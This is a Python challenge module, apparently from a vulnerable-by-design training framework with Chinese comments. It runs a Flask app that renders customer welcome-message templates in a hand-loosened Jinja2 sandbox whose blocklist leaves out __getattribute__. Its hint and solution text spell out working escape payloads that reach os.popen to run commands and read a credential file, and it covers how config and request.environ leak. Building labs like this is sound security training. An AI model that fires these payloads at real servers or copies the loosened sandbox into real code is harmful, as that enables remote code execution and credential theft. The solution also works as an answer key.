"""欢迎语模板处的 Jinja2 沙箱逃逸。

业务场景是"让企业客户自定义后台的欢迎语"：客户在设置里写一段模板，
服务端渲染出来。

开发知道这很危险，所以用了 Jinja2 的 `SandboxedEnvironment` —— 然后**觉得默认
那个太严了**（连 `user.__dict__` 都取不到），于是自己继承了一个子类，
只把几个"听上去最危险"的名字拉黑。

这一题的看点就在这里：**自制的沙箱黑名单**。

关于"真正的 Jinja2 沙箱能不能逃出来"也得说清楚（我在 Jinja2 3.1.6 上实测过）：
原生 `SandboxedEnvironment` 会拦掉所有以下划线开头的属性访问，
`__class__.__mro__`、`|attr('__globals__')`、`'{}'.format`、`map(attribute=...)`
这些经典链**全部失效**。所以这一题讲的不是"Jinja2 的沙箱有洞"，
而是**自己放宽沙箱之后留下的洞** —— 这才是真实世界里更常见的情况。
"""

import re

from jinja2.sandbox import SandboxedEnvironment

from vuln4all import Vuln, render_template, request

#: 只有命令执行才读得到的东西。它出现在**渲染结果**里 = 逃出来了。
SENTINEL = "WELCOME-OPS-2d6b93"

SECRET_DIR = "private"
SECRET_FILE = "ops-token.txt"

GOAL = "从沙箱里逃出去，读到私有目录里的凭据（内容会出现在渲染结果里）"

#: 沙箱允许的模板变量。
CONTEXT = {
    "company": "示例科技",
    "plan": "专业版",
    "user": {"name": "alice", "email": "alice@corp.example"},
    "now": "2026-03-01",
}


class LooseSandbox(SandboxedEnvironment):
    """开发自己放宽过的沙箱。

    ↓↓↓ 洞就在这里 ↓↓↓

    想法是：默认那个"太严了"，模板里取个 `__dict__`、`__getattribute__` 都不行，
    业务上不方便。于是改成"只拉黑几个听起来最危险的名字"。

    但"按名字拉黑"这条路走不通，原因有两层：

      1. 黑名单永远列不全 —— 下面这份列了 9 个，看着挺认真，
         但漏了 `__getattribute__`
      2. `__getattribute__` 是"用**调用**的方式取属性"，它**根本不经过**
         `is_safe_attribute`。所以只要它没被拉黑，等于黑名单作废。
    """

    BLOCKED = {
        "__globals__", "__builtins__", "__subclasses__", "__import__",
        "__loader__", "__code__", "__reduce__", "__base__", "__mro__",
    }

    def is_safe_attribute(self, obj, attr, value):
        return attr not in self.BLOCKED
        # ↑↑↑ 正确做法：别放宽默认实现。默认实现是
        #     `not (attr.startswith("_") or is_internal_attribute(obj, attr))`，
        #     它拦的正是"从对象逃到 Python 内部"这条路。
        #     想给模板更多能力，就**显式往上下文里放具体的值**，
        #     而不是把沙箱放宽。 ↑↑↑


class SandboxEscape(Vuln):
    info = {
        "name": "欢迎语模板处的 Jinja2 沙箱逃逸",
        "author": ["guaidao2"],
        "cwe": "CWE-1336",
        "owasp": "A03:2021 - Injection",
        "difficulty": "困难",
        "description": (
            "企业客户可以自定义后台欢迎语，服务端渲染出来。"
            "开发用了 Jinja2 的 `SandboxedEnvironment`，"
            "但觉得默认那个太严，于是自己放宽成一个「只拉黑几个名字」的子类。\n"
            "这份黑名单漏了 `__getattribute__` —— 而它是不经过属性检查的。"
        ),
        "hint": (
            "先试试最经典的链子，看看沙箱挡住了什么：\n"
            "  {{ ''.__class__.__mro__ }}\n"
            "  {{ lipsum.__globals__ }}\n"
            "  {{ ''.__class__.__subclasses__() }}\n"
            "你会发现有的被挡、有的只是渲染成空 —— 把沙箱的黑名单试出来。\n"
            "然后换个角度问：**有没有哪种方式「取属性」是不走属性检查的？**\n"
            "（提示：Python 里有个特殊方法，它的名字就叫「取属性」，\n"
            "  而它的作用就是**绕过**普通的属性查找。）\n"
            "另外 `lipsum`、`cycler` 这些名字是 Jinja 默认就放在模板里的。"
        ),
        "solution": (
            "一、先把沙箱的黑名单试出来。这几条都会失败或者渲染成空：\n\n"
            "   {{ ''.__class__.__mro__ }}\n"
            "   {{ ''.__class__.__subclasses__() }}\n"
            "   {{ lipsum.__globals__ }}\n"
            "   {{ lipsum|attr('__globals__') }}\n\n"
            "   注意 `|attr(...)` 也没用 —— 它内部还是会问沙箱。\n\n"
            "二、关键的一步：黑名单里没有 `__getattribute__`。\n\n"
            "   而 `obj.__getattribute__('名字')` 等价于 `obj.名字`，\n"
            "   区别在于它是**一次方法调用** —— 沙箱的 `is_safe_attribute`\n"
            "   只拦截属性访问，拦不到它。\n\n"
            "   {{ lipsum.__getattribute__('__globals__') }}\n\n"
            "   这一下就把全局名字空间整个交出来了。\n\n"
            "三、接上命令执行（`jinja2.utils` 的全局里有 `os`）：\n\n"
            "   {{ lipsum.__getattribute__('__globals__')['os'].popen('id').read() }}\n\n"
            "四、读这一题的目标文件（页面下半部分给了完整路径）：\n\n"
            "   {{ lipsum.__getattribute__('__globals__')['os']\n"
            "       .popen('cat <目标文件路径>').read() }}\n\n"
            "   那串 WELCOME-OPS- 开头的凭据出现在渲染结果里就通关了。\n\n"
            "其他同样能过的写法（黑名单是按**名字**拉黑的，所以换名字就行）：\n\n"
            "   {{ cycler.__init__.__getattribute__('__globals__')['os'].popen('id').read() }}\n"
            "   {{ lipsum.__getattribute__('__glo'~'bals__')['os'].popen('id').read() }}\n"
            "   {{ joiner.__getattribute__('__globals__')['os'].popen('id').read() }}\n\n"
            "   最后那条用 `~` 拼字符串的写法说明了一件事：\n"
            "   **如果黑名单是在源码上做字符串匹配的，拼接就能绕过；**\n"
            "   而这一题的黑名单在属性检查那一层，所以拼不拼都行 ——\n"
            "   真正的问题是**它漏了 `__getattribute__` 这个名字**。\n\n"
            "关于 Jinja2 原生沙箱（值得知道，省得把结论搞错）：\n\n"
            "   我在 Jinja2 3.1.6 上实测过 `SandboxedEnvironment`：\n"
            "     · `''.__class__` / `''.__class__.__mro__`     → 被挡\n"
            "     · `lipsum.__globals__` / `|attr('__globals__')` → 被挡\n"
            "     · `'{}'.format(...)` 里的属性链                → 被挡（Jinja 专门处理了）\n"
            "     · `|map(attribute='__class__')` / `|groupby`    → 被挡\n"
            "     · `{% include '/etc/passwd' %}`                → 没有 loader，失败\n"
            "   因为它拦的是「**以下划线开头**的属性」，那是从对象逃到 Python 内部的\n"
            "   唯一入口。所以那一版沙箱**没有**这些逃逸链。\n"
            "   真正要紧的是它挡不住的东西：\n"
            "     · `{{ config }}`     → **原样泄露**（Flask 的 config 里有 SECRET_KEY）\n"
            "     · `{{ request.environ }}` → **原样泄露**环境变量\n"
            "   也就是说：**沙箱管不住「你放进上下文的东西」。**\n"
            "   上下文里放了什么，模板就能拿到什么 —— 这跟沙箱严不严没关系。"
        ),
        "refs": [
            "https://jinja.palletsprojects.com/en/stable/sandbox/",
            "https://portswigger.net/web-security/server-side-template-injection",
        ],
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        (ctx.workspace / SECRET_DIR).mkdir(parents=True, exist_ok=True)
        (ctx.workspace / SECRET_DIR / SECRET_FILE).write_text(
            "欢迎语后台凭据\n接口令牌：" + SENTINEL + "\n", encoding="utf-8"
        )

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        secret_path = ctx.workspace / SECRET_DIR / SECRET_FILE
        sandbox = LooseSandbox()

        @app.route("/", methods=["GET", "POST"])
        def index():
            source = "你好，{{ user.name }}！欢迎回到{{ company }}（{{ plan }}）。"
            rendered = None
            error = None

            if request.method == "POST":
                source = request.form.get("template", "")

                try:
                    # ↓↓↓ 洞在这里：用户给的源码交给一个"放宽过的"沙箱渲染 ↓↓↓
                    rendered = sandbox.from_string(source).render(**CONTEXT)
                    # ↑↑↑ 正确做法：要么用**原生** SandboxedEnvironment 且不放
                    #     有能力的对象进上下文；要么**别让用户写模板** ——
                    #     自定义文案就该用占位符（%s / {name}），不是模板语言 ↑↑↑
                except Exception as exc:  # noqa: BLE001
                    error = "%s: %s" % (type(exc).__name__, exc)
                    rendered = None

                if rendered and SENTINEL in rendered:
                    ctx.progress.mark(GOAL)

            return render_template(
                "index.html",
                source=source,
                rendered=rendered,
                error=error,
                context=CONTEXT,
                blocked=BLOCKED_NAMES,
                secret_path=str(secret_path),
            )

        return {"": app}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {GOAL: ctx.progress.achieved(GOAL)}


#: 给页面显示用 —— 让做题的人知道沙箱拉黑了哪些名字。
BLOCKED_NAMES = sorted(LooseSandbox.BLOCKED)

_ = re  # 源码匹配式的黑名单在 writeup 里对比过
